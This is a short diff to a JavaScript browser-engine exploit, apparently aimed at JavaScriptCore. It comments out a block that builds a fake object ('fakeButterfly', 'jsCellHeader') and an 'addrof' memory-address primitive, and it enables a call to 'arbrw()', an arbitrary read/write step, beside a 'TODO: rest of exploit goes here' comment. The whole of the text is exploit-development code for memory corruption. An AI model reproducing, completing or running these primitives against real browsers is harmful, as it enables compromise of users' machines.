@@ -483,6 +483,7 @@ var VM_PROT_EXECUTE = 0x4
               a1[offset] = new Int64(addr).asDouble();
               return b1[0];
             }
+            /*
             let obj = {
               jsCellHeader: doubleArrayCellHeader,
               fakeButterfly: a0
@@ -515,7 +516,7 @@ var VM_PROT_EXECUTE = 0x4
             addrof = (val) => {
               b1[0] = val;
               return new Int64.fromDouble(a1[0]);
-            }
+            }*/
             
             port.postMessage("We got stableish addrof and fakeobj");
             
@@ -793,7 +794,7 @@ var VM_PROT_EXECUTE = 0x4
               gc();
 
               // TODO: rest of exploit goes here
-              //arbrw();
+              arbrw();
               port.postMessage("done!");
             } catch(e) { // send exception strings to main thread (for debugging)
               port.postMessage("Exception!!");
